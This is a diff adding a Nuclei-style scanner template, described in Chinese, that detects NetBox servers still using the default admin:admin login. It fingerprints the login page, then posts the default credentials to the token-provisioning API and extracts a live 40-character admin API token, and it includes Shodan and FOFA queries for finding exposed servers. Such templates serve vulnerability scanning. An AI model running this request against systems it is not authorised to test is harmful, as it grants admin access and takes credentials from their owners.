@@ -1,0 +1,64 @@
+id: netbox-default-admin-credential-risk
+
+info:
+  name: NetBox 默认管理员账号口令风险
+  author: 0x_Akoko
+  severity: high
+  description: |
+    检测到 NetBox 实例使用了默认管理员凭据 admin:admin。官方 netbox-docker 部署默认将 SUPERUSER_NAME 与 SUPERUSER_PASSWORD 均设置为 admin，攻击者可借此直接获取后台管理权限。
+  reference:
+    - https://github.com/netbox-community/netbox-docker
+    - https://docs.netbox.dev/en/stable/integrations/rest-api/#authenticating-to-the-api
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: netbox-community
+    product: netbox
+    shodan-query: 'http.title:"NetBox"'
+    fofa-query: 'title="NetBox" || body="netbox-community"'
+  tags: NetBox
+  remediation: >-
+    升级受影响产品至最新的厂商支持版本，并安装所有可用的安全补丁。如果暂时无法升级，应限制对受影响端点的访问，尽可能禁用存在风险的功能，并采取身份认证、网络隔离和请求过滤等补偿性措施。同时检查相关 日志，并轮换可能已暴露的凭据或密钥。
+
+variables:
+  username: "admin"
+  password: "admin"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /login/ HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+    matchers:
+      - type: dsl
+        internal: true
+        dsl:
+          - 'status_code == 200'
+          - 'contains_all(to_lower(body), "netbox", "csrfmiddlewaretoken")'
+        condition: and
+  - raw:
+      - |
+        POST /api/users/tokens/provision/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json
+
+        {"username":"{{username}}","password":"{{password}}"}
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 201'
+          - 'contains(content_type, "application/json")'
+          - 'contains_all(body, "\"key\"", "\"user\"", "\"username\"")'
+        condition: and
+    extractors:
+      - type: regex
+        name: api_token
+        part: body
+        regex:
+          - '"key"\s*:\s*"([a-f0-9]{40})"'
+
+# digest: 4a0a0047304502205f727d9d56418421260097f5213ffb63af5b14514b46e7a673347055158e1443022100e49ae23b3cc7ff68916638f18e5a91bfd248e0cb96642c333cbee027c44cdda5:922c64590222798bb761d5b6d8e72950
